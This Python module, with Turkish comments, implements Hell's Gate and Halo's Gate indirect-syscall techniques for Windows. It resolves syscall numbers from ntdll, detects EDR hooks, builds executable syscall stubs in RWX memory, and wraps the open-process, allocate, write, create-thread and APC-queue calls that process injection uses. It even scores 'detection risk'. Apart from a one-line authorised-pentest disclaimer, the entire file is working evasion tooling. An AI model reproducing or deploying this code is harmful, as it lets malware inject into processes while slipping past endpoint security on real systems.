"""
Indirect Syscalls Module
========================
Hell's Gate / Halo's Gate / Tartarus Gate style indirect syscalls

Userland hook bypass teknikleri:
- SSN (System Service Number) resolution from ntdll.dll
- Syscall stub generation
- Indirect syscall execution (jump to syscall instruction in ntdll)
- Dynamic SSN extraction even when ntdll is hooked

⚠️ YASAL UYARI: Bu modül sadece yetkili penetrasyon testleri içindir.
"""

from __future__ import annotations
import ctypes
import struct
import os
import sys
import hashlib
import secrets
import logging
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any, Callable
from enum import Enum, auto

logger = logging.getLogger("indirect_syscalls")


# ============================================================
# ENUMS & CONSTANTS
# ============================================================

class SyscallTechnique(Enum):
    """Syscall bypass teknikleri"""
    HELLS_GATE = "hells_gate"           # Original Hell's Gate
    HALOS_GATE = "halos_gate"           # Halo's Gate (neighbor SSN)
    TARTARUS_GATE = "tartarus_gate"     # Tartarus Gate (exception handling)
    SYSWHISPERS2 = "syswhispers2"       # SysWhispers2 style
    SYSWHISPERS3 = "syswhispers3"       # SysWhispers3 (indirect + dynamic)
    FRESH_COPY = "fresh_copy"           # Map fresh ntdll copy
    DIRECT = "direct"                   # Direct syscall (no indirection)


class SyscallStatus(Enum):
    """Syscall execution durumu"""
    SUCCESS = "success"
    HOOKED = "hooked"
    NOT_FOUND = "not_found"
    INVALID_SSN = "invalid_ssn"
    EXECUTION_ERROR = "execution_error"


# Windows constants
IMAGE_DOS_SIGNATURE = 0x5A4D      # MZ
IMAGE_NT_SIGNATURE = 0x00004550  # PE\0\0

# Common syscall numbers (Windows 10/11 - may vary by build)
# These are resolved dynamically, these are fallbacks
SYSCALL_STUBS = {
    "NtAllocateVirtualMemory": 0x18,
    "NtWriteVirtualMemory": 0x3A,
    "NtProtectVirtualMemory": 0x50,
    "NtCreateThreadEx": 0xC1,
    "NtOpenProcess": 0x26,
    "NtClose": 0x0F,
    "NtQuerySystemInformation": 0x36,
    "NtCreateSection": 0x4A,
    "NtMapViewOfSection": 0x28,
    "NtUnmapViewOfSection": 0x2A,
    "NtQueueApcThread": 0x45,
    "NtResumeThread": 0x52,
    "NtSuspendThread": 0x1B5,
    "NtSetContextThread": 0x18B,
    "NtGetContextThread": 0xF2,
    "NtCreateProcess": 0xB4,
    "NtCreateProcessEx": 0x4D,
    "NtSetInformationFile": 0x27,
    "NtCreateFile": 0x55,
    "NtReadVirtualMemory": 0x3F,
}


# ============================================================
# DATACLASSES
# ============================================================

@dataclass
class SyscallEntry:
    """Single syscall entry"""
    name: str
    ssn: int                      # System Service Number
    address: int = 0              # Address of syscall instruction in ntdll
    syscall_ret_addr: int = 0     # Address of 'syscall; ret' gadget
    is_hooked: bool = False
    hook_detected_by: str = ""


@dataclass
class SyscallConfig:
    """Syscall resolution configuration"""
    technique: SyscallTechnique = SyscallTechnique.SYSWHISPERS3
    use_indirect: bool = True           # Use indirect syscalls
    use_fresh_ntdll: bool = False       # Map clean ntdll from disk
    jit_resolve: bool = True            # Resolve SSN just-in-time
    randomize_order: bool = True        # Randomize syscall order
    add_jitter: bool = True             # Add timing jitter
    encrypt_stubs: bool = True          # Encrypt syscall stubs in memory
    detect_hooks: bool = True           # Detect ntdll hooks first


@dataclass
class SyscallResult:
    """Syscall execution sonucu"""
    success: bool
    status: SyscallStatus
    syscall_name: str
    ssn: int = 0
    return_value: int = 0
    error: str = ""
    technique_used: SyscallTechnique = SyscallTechnique.DIRECT
    execution_time_ns: int = 0
    detection_risk: float = 0.1


# ============================================================
# HELL'S GATE SSN RESOLVER
# ============================================================

class HellsGateResolver:
    """
    Hell's Gate - Dynamic SSN Resolution
    
    Parses ntdll.dll export table to extract SSN directly
    without relying on hardcoded values.
    
    Pattern:
    mov r10, rcx          ; 4C 8B D1
    mov eax, SSN          ; B8 XX XX 00 00
    syscall               ; 0F 05
    ret                   ; C3
    """
    
    # Syscall stub patterns
    MOV_R10_RCX = bytes([0x4C, 0x8B, 0xD1])  # mov r10, rcx
    MOV_EAX = bytes([0xB8])                    # mov eax, imm32
    SYSCALL = bytes([0x0F, 0x05])              # syscall
    RET = bytes([0xC3])                        # ret
    
    # Hook detection patterns (common EDR hooks)
    JMP_HOOK = bytes([0xE9])                   # jmp rel32
    JMP_QWORD = bytes([0xFF, 0x25])            # jmp qword ptr
    INT3 = bytes([0xCC])                       # int3 breakpoint
    
    def __init__(self, config: SyscallConfig = None):
        self.config = config or SyscallConfig()
        self._is_windows = sys.platform == 'win32'
        self._syscall_cache: Dict[str, SyscallEntry] = {}
        self._ntdll_base: int = 0
        self._fresh_ntdll_base: int = 0
        
        if self._is_windows:
            self._init_windows()
    
    def _init_windows(self):
        """Initialize Windows-specific components"""
        try:
            self.kernel32 = ctypes.windll.kernel32
            self.ntdll = ctypes.windll.ntdll
            
            # Get ntdll base address
            self._ntdll_base = self.kernel32.GetModuleHandleA(b"ntdll.dll")
            
            if self.config.use_fresh_ntdll:
                self._load_fresh_ntdll()
                
        except Exception as e:
            logger.error(f"Windows init failed: {e}")
    
    def _load_fresh_ntdll(self):
        """Load clean copy of ntdll from disk"""
        try:
            ntdll_path = r"C:\Windows\System32\ntdll.dll"
            
            # Read file
            with open(ntdll_path, 'rb') as f:
                ntdll_data = f.read()
            
            # Allocate memory for fresh copy
            size = len(ntdll_data)
            mem = self.kernel32.VirtualAlloc(
                None, size,
                0x3000,  # MEM_COMMIT | MEM_RESERVE
                0x40     # PAGE_EXECUTE_READWRITE
            )
            
            if mem:
                # Copy ntdll
                ctypes.memmove(mem, ntdll_data, size)
                self._fresh_ntdll_base = mem
                logger.info(f"Fresh ntdll loaded at 0x{mem:016X}")
                
        except Exception as e:
            logger.error(f"Failed to load fresh ntdll: {e}")
    
    def resolve_ssn(self, func_name: str) -> SyscallEntry:
        """
        Resolve SSN for given function using Hell's Gate technique
        
        Args:
            func_name: NT function name (e.g., "NtAllocateVirtualMemory")
        
        Returns:
            SyscallEntry with SSN and address
        """
        # Check cache
        if func_name in self._syscall_cache:
            return self._syscall_cache[func_name]
        
        entry = SyscallEntry(name=func_name, ssn=-1)
        
        if not self._is_windows:
            entry.ssn = SYSCALL_STUBS.get(func_name, -1)
            return entry
        
        try:
            # Get function address from ntdll
            base = self._fresh_ntdll_base if self._fresh_ntdll_base else self._ntdll_base
            func_addr = self._get_export_address(base, func_name)
            
            if not func_addr:
                entry.ssn = SYSCALL_STUBS.get(func_name, -1)
                return entry
            
            entry.address = func_addr
            
            # Read first bytes to extract SSN
            stub = (ctypes.c_char * 32).from_address(func_addr)
            stub_bytes = bytes(stub)
            
            # Check for hooks
            if self.config.detect_hooks:
                entry.is_hooked = self._detect_hook(stub_bytes)
                if entry.is_hooked:
                    logger.warning(f"{func_name} is hooked!")
                    # Try Halo's Gate if hooked
                    return self._halos_gate_resolve(func_name, func_addr)
            
            # Hell's Gate pattern: mov r10, rcx; mov eax, SSN
            if stub_bytes[:3] == self.MOV_R10_RCX and stub_bytes[3:4] == self.MOV_EAX:
                # SSN is at offset 4-5 (little endian)
                entry.ssn = struct.unpack('<H', stub_bytes[4:6])[0]
                
                # Find syscall instruction for indirect call
                syscall_offset = stub_bytes.find(self.SYSCALL)
                if syscall_offset > 0:
                    entry.syscall_ret_addr = func_addr + syscall_offset
            else:
                # Fallback to hardcoded
                entry.ssn = SYSCALL_STUBS.get(func_name, -1)
            
            # Cache result
            self._syscall_cache[func_name] = entry
            
        except Exception as e:
            logger.error(f"SSN resolution failed for {func_name}: {e}")
            entry.ssn = SYSCALL_STUBS.get(func_name, -1)
        
        return entry
    
    def _detect_hook(self, stub_bytes: bytes) -> bool:
        """Detect if function is hooked"""
        # Common hook patterns
        if stub_bytes[:1] == self.JMP_HOOK:
            return True
        if stub_bytes[:2] == self.JMP_QWORD:
            return True
        if stub_bytes[:1] == self.INT3:
            return True
        
        # Check if standard pattern is broken
        if stub_bytes[:3] != self.MOV_R10_RCX:
            return True
        
        return False
    
    def _halos_gate_resolve(self, func_name: str, func_addr: int) -> SyscallEntry:
        """
        Halo's Gate - Resolve SSN from neighboring syscall
        
        When target function is hooked, look at neighbors which
        might not be hooked to calculate the SSN.
        """
        entry = SyscallEntry(
            name=func_name,
            ssn=-1,
            address=func_addr,
            is_hooked=True,
            hook_detected_by="halos_gate"
        )
        
        try:
            # Search up and down for unhooked neighbors
            stub_size = 32
            
            for direction in [1, -1]:  # Down then up
                for offset in range(1, 20):
                    neighbor_addr = func_addr + (direction * offset * stub_size)
                    
                    stub = (ctypes.c_char * 32).from_address(neighbor_addr)
                    stub_bytes = bytes(stub)
                    
                    if stub_bytes[:3] == self.MOV_R10_RCX and stub_bytes[3:4] == self.MOV_EAX:
                        # Found unhooked neighbor
                        neighbor_ssn = struct.unpack('<H', stub_bytes[4:6])[0]
                        
                        # Calculate our SSN (neighbors differ by 1)
                        entry.ssn = neighbor_ssn - (direction * offset)
                        
                        # Find syscall gadget in neighbor
                        syscall_offset = stub_bytes.find(self.SYSCALL)
                        if syscall_offset > 0:
                            entry.syscall_ret_addr = neighbor_addr + syscall_offset
                        
                        logger.info(f"Halo's Gate: resolved {func_name} SSN={entry.ssn} from neighbor offset {offset}")
                        return entry
            
            # Fallback
            entry.ssn = SYSCALL_STUBS.get(func_name, -1)
            
        except Exception as e:
            logger.error(f"Halo's Gate failed: {e}")
            entry.ssn = SYSCALL_STUBS.get(func_name, -1)
        
        return entry
    
    def _get_export_address(self, module_base: int, func_name: str) -> int:
        """Get export address from module PE"""
        try:
            # Parse PE headers
            dos_header = (ctypes.c_char * 64).from_address(module_base)
            
            # Verify DOS signature
            if struct.unpack('<H', dos_header[:2])[0] != IMAGE_DOS_SIGNATURE:
                return 0
            
            # Get PE header offset
            pe_offset = struct.unpack('<I', dos_header[60:64])[0]
            pe_header = module_base + pe_offset
            
            # Verify PE signature
            pe_sig = (ctypes.c_char * 4).from_address(pe_header)
            if struct.unpack('<I', pe_sig[:])[0] != IMAGE_NT_SIGNATURE:
                return 0
            
            # Get export directory RVA (offset 136 in PE64)
            optional_header = pe_header + 24
            export_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(optional_header + 112)[:])[0]
            
            if export_rva == 0:
                return 0
            
            export_dir = module_base + export_rva
            
            # Parse export directory
            num_names = struct.unpack('<I', (ctypes.c_char * 4).from_address(export_dir + 24)[:])[0]
            name_table_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(export_dir + 32)[:])[0]
            ordinal_table_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(export_dir + 36)[:])[0]
            addr_table_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(export_dir + 28)[:])[0]
            
            name_table = module_base + name_table_rva
            ordinal_table = module_base + ordinal_table_rva
            addr_table = module_base + addr_table_rva
            
            # Search for function name
            target_name = func_name.encode()
            
            for i in range(num_names):
                name_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(name_table + i * 4)[:])[0]
                name_addr = module_base + name_rva
                
                # Read name string
                name_bytes = (ctypes.c_char * 64).from_address(name_addr)
                name = bytes(name_bytes).split(b'\x00')[0]
                
                if name == target_name:
                    # Get ordinal
                    ordinal = struct.unpack('<H', (ctypes.c_char * 2).from_address(ordinal_table + i * 2)[:])[0]
                    
                    # Get function address
                    func_rva = struct.unpack('<I', (ctypes.c_char * 4).from_address(addr_table + ordinal * 4)[:])[0]
                    
                    return module_base + func_rva
            
        except Exception as e:
            logger.error(f"Export resolution failed: {e}")
        
        return 0
    
    def get_all_syscalls(self) -> Dict[str, SyscallEntry]:
        """Resolve all known syscalls"""
        for func_name in SYSCALL_STUBS.keys():
            self.resolve_ssn(func_name)
        return self._syscall_cache


# ============================================================
# INDIRECT SYSCALL EXECUTOR
# ============================================================

class IndirectSyscallExecutor:
    """
    Execute syscalls indirectly through ntdll
    
    Instead of having syscall instruction in our code,
    we jump to the syscall instruction in ntdll.dll.
    This bypasses syscall-based detection.
    """
    
    def __init__(self, config: SyscallConfig = None):
        self.config = config or SyscallConfig()
        self.resolver = HellsGateResolver(config)
        self._is_windows = sys.platform == 'win32'
        self._stub_cache: Dict[str, bytes] = {}
    
    def call(self, func_name: str, *args) -> SyscallResult:
        """
        Execute syscall indirectly
        
        Args:
            func_name: NT function name
            *args: Function arguments
        
        Returns:
            SyscallResult
        """
        result = SyscallResult(
            success=False,
            status=SyscallStatus.NOT_FOUND,
            syscall_name=func_name,
            technique_used=self.config.technique
        )
        
        if not self._is_windows:
            result.error = "Windows only"
            return result
        
        import time
        start = time.perf_counter_ns()
        
        try:
            # Resolve SSN
            entry = self.resolver.resolve_ssn(func_name)
            result.ssn = entry.ssn
            
            if entry.ssn < 0:
                result.status = SyscallStatus.NOT_FOUND
                result.error = f"Could not resolve SSN for {func_name}"
                return result
            
            if entry.is_hooked:
                result.status = SyscallStatus.HOOKED
                logger.warning(f"{func_name} is hooked, using indirect method")
            
            # Add jitter if configured
            if self.config.add_jitter:
                import random
                time.sleep(random.uniform(0.001, 0.005))
            
            # Execute based on technique
            if self.config.use_indirect and entry.syscall_ret_addr:
                ret_val = self._indirect_call(entry, args)
            else:
                ret_val = self._direct_call(entry, args)
            
            result.return_value = ret_val
            result.success = ret_val >= 0
            result.status = SyscallStatus.SUCCESS if result.success else SyscallStatus.EXECUTION_ERROR
            
        except Exception as e:
            result.status = SyscallStatus.EXECUTION_ERROR
            result.error = str(e)
        
        result.execution_time_ns = time.perf_counter_ns() - start
        result.detection_risk = self._calculate_detection_risk(result)
        
        return result
    
    def _indirect_call(self, entry: SyscallEntry, args: tuple) -> int:
        """
        Execute syscall by jumping to ntdll's syscall instruction
        
        This avoids having 'syscall' opcode in our own code
        """
        try:
            # Build indirect syscall stub
            # mov r10, rcx
            # mov eax, SSN
            # jmp [syscall_ret_addr in ntdll]
            
            stub = self._build_indirect_stub(entry.ssn, entry.syscall_ret_addr)
            
            # Allocate executable memory
            kernel32 = ctypes.windll.kernel32
            stub_addr = kernel32.VirtualAlloc(
                None, len(stub),
                0x3000,  # MEM_COMMIT | MEM_RESERVE
                0x40     # PAGE_EXECUTE_READWRITE
            )
            
            if not stub_addr:
                raise Exception("VirtualAlloc failed")
            
            # Copy stub
            ctypes.memmove(stub_addr, stub, len(stub))
            
            # Create function type
            func_type = ctypes.CFUNCTYPE(
                ctypes.c_longlong,
                *[ctypes.c_void_p] * len(args)
            )
            
            func = func_type(stub_addr)
            
            # Call
            result = func(*[ctypes.c_void_p(a) if isinstance(a, int) else a for a in args])
            
            # Cleanup
            kernel32.VirtualFree(stub_addr, 0, 0x8000)  # MEM_RELEASE
            
            return result
            
        except Exception as e:
            logger.error(f"Indirect call failed: {e}")
            raise
    
    def _direct_call(self, entry: SyscallEntry, args: tuple) -> int:
        """Direct syscall (contains syscall instruction in our code)"""
        try:
            # Build direct syscall stub
            stub = self._build_direct_stub(entry.ssn)
            
            kernel32 = ctypes.windll.kernel32
            stub_addr = kernel32.VirtualAlloc(
                None, len(stub),
                0x3000, 0x40
            )
            
            if not stub_addr:
                raise Exception("VirtualAlloc failed")
            
            ctypes.memmove(stub_addr, stub, len(stub))
            
            func_type = ctypes.CFUNCTYPE(
                ctypes.c_longlong,
                *[ctypes.c_void_p] * len(args)
            )
            
            func = func_type(stub_addr)
            result = func(*[ctypes.c_void_p(a) if isinstance(a, int) else a for a in args])
            
            kernel32.VirtualFree(stub_addr, 0, 0x8000)
            
            return result
            
        except Exception as e:
            logger.error(f"Direct call failed: {e}")
            raise
    
    def _build_indirect_stub(self, ssn: int, syscall_addr: int) -> bytes:
        """Build indirect syscall stub (x64)"""
        # mov r10, rcx          ; 4C 8B D1
        # mov eax, <ssn>        ; B8 XX XX 00 00
        # mov rbx, <addr>       ; 48 BB XX XX XX XX XX XX XX XX
        # jmp rbx               ; FF E3
        
        stub = bytearray([
            0x4C, 0x8B, 0xD1,                                    # mov r10, rcx
            0xB8, ssn & 0xFF, (ssn >> 8) & 0xFF, 0x00, 0x00,    # mov eax, ssn
            0x48, 0xBB,                                          # mov rbx, imm64
        ])
        stub.extend(struct.pack('<Q', syscall_addr))             # syscall address
        stub.extend([0xFF, 0xE3])                                # jmp rbx
        
        return bytes(stub)
    
    def _build_direct_stub(self, ssn: int) -> bytes:
        """Build direct syscall stub (x64)"""
        # mov r10, rcx          ; 4C 8B D1
        # mov eax, <ssn>        ; B8 XX XX 00 00
        # syscall               ; 0F 05
        # ret                   ; C3
        
        stub = bytearray([
            0x4C, 0x8B, 0xD1,                                    # mov r10, rcx
            0xB8, ssn & 0xFF, (ssn >> 8) & 0xFF, 0x00, 0x00,    # mov eax, ssn
            0x0F, 0x05,                                          # syscall
            0xC3                                                 # ret
        ])
        
        return bytes(stub)
    
    def _calculate_detection_risk(self, result: SyscallResult) -> float:
        """Calculate detection risk based on execution details"""
        risk = 0.1  # Base risk for indirect syscalls
        
        if result.technique_used == SyscallTechnique.DIRECT:
            risk += 0.3  # Direct syscalls more likely detected
        
        if result.status == SyscallStatus.HOOKED:
            risk += 0.2  # Hook evasion detected
        
        if result.execution_time_ns < 100000:  # Very fast
            risk += 0.1  # Might be flagged for speed
        
        return min(risk, 1.0)


# ============================================================
# SYSCALL MANAGER (HIGH-LEVEL API)
# ============================================================

class SyscallManager:
    """
    High-level syscall management API
    
    Provides easy-to-use interface for common syscall operations
    with automatic SSN resolution and hook evasion.
    """
    
    def __init__(self, config: SyscallConfig = None):
        self.config = config or SyscallConfig()
        self.executor = IndirectSyscallExecutor(config)
        self._is_windows = sys.platform == 'win32'
    
    def allocate_memory(self, process_handle: int, size: int, 
                        protection: int = 0x40) -> Tuple[int, SyscallResult]:
        """
        NtAllocateVirtualMemory wrapper
        
        Args:
            process_handle: Target process handle
            size: Allocation size
            protection: Memory protection (default PAGE_EXECUTE_READWRITE)
        
        Returns:
            Tuple of (allocated address, SyscallResult)
        """
        if not self._is_windows:
            return (0, SyscallResult(success=False, status=SyscallStatus.NOT_FOUND,
                                     syscall_name="NtAllocateVirtualMemory", error="Windows only"))
        
        base_addr = ctypes.c_void_p(0)
        region_size = ctypes.c_size_t(size)
        
        result = self.executor.call(
            "NtAllocateVirtualMemory",
            process_handle,
            ctypes.byref(base_addr),
            0,
            ctypes.byref(region_size),
            0x3000,  # MEM_COMMIT | MEM_RESERVE
            protection
        )
        
        return (base_addr.value or 0, result)
    
    def write_memory(self, process_handle: int, address: int, 
                     data: bytes) -> SyscallResult:
        """
        NtWriteVirtualMemory wrapper
        
        Args:
            process_handle: Target process handle
            address: Destination address
            data: Data to write
        
        Returns:
            SyscallResult
        """
        if not self._is_windows:
            return SyscallResult(success=False, status=SyscallStatus.NOT_FOUND,
                               syscall_name="NtWriteVirtualMemory", error="Windows only")
        
        buffer = (ctypes.c_char * len(data)).from_buffer_copy(data)
        bytes_written = ctypes.c_size_t(0)
        
        result = self.executor.call(
            "NtWriteVirtualMemory",
            process_handle,
            address,
            ctypes.byref(buffer),
            len(data),
            ctypes.byref(bytes_written)
        )
        
        return result
    
    def protect_memory(self, process_handle: int, address: int, 
                       size: int, protection: int) -> SyscallResult:
        """
        NtProtectVirtualMemory wrapper
        
        Args:
            process_handle: Target process handle
            address: Memory address
            size: Region size
            protection: New protection flags
        
        Returns:
            SyscallResult
        """
        if not self._is_windows:
            return SyscallResult(success=False, status=SyscallStatus.NOT_FOUND,
                               syscall_name="NtProtectVirtualMemory", error="Windows only")
        
        base_addr = ctypes.c_void_p(address)
        region_size = ctypes.c_size_t(size)
        old_protect = ctypes.c_ulong(0)
        
        result = self.executor.call(
            "NtProtectVirtualMemory",
            process_handle,
            ctypes.byref(base_addr),
            ctypes.byref(region_size),
            protection,
            ctypes.byref(old_protect)
        )
        
        return result
    
    def create_thread(self, process_handle: int, start_address: int,
                      parameter: int = 0, suspended: bool = False) -> Tuple[int, SyscallResult]:
        """
        NtCreateThreadEx wrapper
        
        Args:
            process_handle: Target process handle
            start_address: Thread start address
            parameter: Thread parameter
            suspended: Create suspended
        
        Returns:
            Tuple of (thread handle, SyscallResult)
        """
        if not self._is_windows:
            return (0, SyscallResult(success=False, status=SyscallStatus.NOT_FOUND,
                                     syscall_name="NtCreateThreadEx", error="Windows only"))
        
        thread_handle = ctypes.c_void_p(0)
        create_flags = 0x01 if suspended else 0  # CREATE_SUSPENDED
        
        result = self.executor.call(
            "NtCreateThreadEx",
            ctypes.byref(thread_handle),
            0x1FFFFF,  # THREAD_ALL_ACCESS
            None,
            process_handle,
            start_address,
            parameter,
            create_flags,
            0, 0, 0, None
        )
        
        return (thread_handle.value or 0, result)
    
    def queue_apc(self, thread_handle: int, apc_routine: int, 
                  arg1: int = 0, arg2: int = 0, arg3: int = 0) -> SyscallResult:
        """
        NtQueueApcThread wrapper
        
        Args:
            thread_handle: Target thread handle
            apc_routine: APC routine address
            arg1, arg2, arg3: APC arguments
        
        Returns:
            SyscallResult
        """
        if not self._is_windows:
            return SyscallResult(success=False, status=SyscallStatus.NOT_FOUND,
                               syscall_name="NtQueueApcThread", error="Windows only")
        
        result = self.executor.call(
            "NtQueueApcThread",
            thread_handle,
            apc_routine,
            arg1, arg2, arg3
        )
        
        return result
    
    def open_process(self, pid: int, access: int = 0x1F0FFF) -> Tuple[int, SyscallResult]:
        """
        NtOpenProcess wrapper
        
        Args:
            pid: Process ID
            access: Desired access (default PROCESS_ALL_ACCESS)
        
        Returns:
            Tuple of (process handle, SyscallResult)
        """
        if not self._is_windows:
            return (0, SyscallResult(success=False, status=SyscallStatus.NOT_FOUND,
                                     syscall_name="NtOpenProcess", error="Windows only"))
        
        class CLIENT_ID(ctypes.Structure):
            _fields_ = [("UniqueProcess", ctypes.c_void_p),
                       ("UniqueThread", ctypes.c_void_p)]
        
        class OBJECT_ATTRIBUTES(ctypes.Structure):
            _fields_ = [
                ("Length", ctypes.c_ulong),
                ("RootDirectory", ctypes.c_void_p),
                ("ObjectName", ctypes.c_void_p),
                ("Attributes", ctypes.c_ulong),
                ("SecurityDescriptor", ctypes.c_void_p),
                ("SecurityQualityOfService", ctypes.c_void_p)
            ]
        
        process_handle = ctypes.c_void_p(0)
        oa = OBJECT_ATTRIBUTES()
        oa.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
        
        client_id = CLIENT_ID()
        client_id.UniqueProcess = pid
        client_id.UniqueThread = 0
        
        result = self.executor.call(
            "NtOpenProcess",
            ctypes.byref(process_handle),
            access,
            ctypes.byref(oa),
            ctypes.byref(client_id)
        )
        
        return (process_handle.value or 0, result)
    
    def close_handle(self, handle: int) -> SyscallResult:
        """NtClose wrapper"""
        if not self._is_windows:
            return SyscallResult(success=False, status=SyscallStatus.NOT_FOUND,
                               syscall_name="NtClose", error="Windows only")
        
        return self.executor.call("NtClose", handle)
    
    def get_detection_risk_summary(self) -> Dict[str, Any]:
        """Get summary of detection risk for cached syscalls"""
        summary = {
            "technique": self.config.technique.value,
            "use_indirect": self.config.use_indirect,
            "cached_syscalls": len(self.executor.resolver._syscall_cache),
            "hooked_functions": [],
            "overall_risk": 0.0,
        }
        
        for name, entry in self.executor.resolver._syscall_cache.items():
            if entry.is_hooked:
                summary["hooked_functions"].append(name)
        
        # Calculate overall risk
        if summary["hooked_functions"]:
            summary["overall_risk"] = 0.5  # EDR presence detected
        elif self.config.use_indirect:
            summary["overall_risk"] = 0.15  # Low risk with indirect
        else:
            summary["overall_risk"] = 0.35  # Medium risk with direct
        
        return summary


# ============================================================
# EXPORTS
# ============================================================

__all__ = [
    # Enums
    "SyscallTechnique",
    "SyscallStatus",
    
    # Dataclasses
    "SyscallEntry",
    "SyscallConfig",
    "SyscallResult",
    
    # Classes
    "HellsGateResolver",
    "IndirectSyscallExecutor",
    "SyscallManager",
    
    # Constants
    "SYSCALL_STUBS",
]
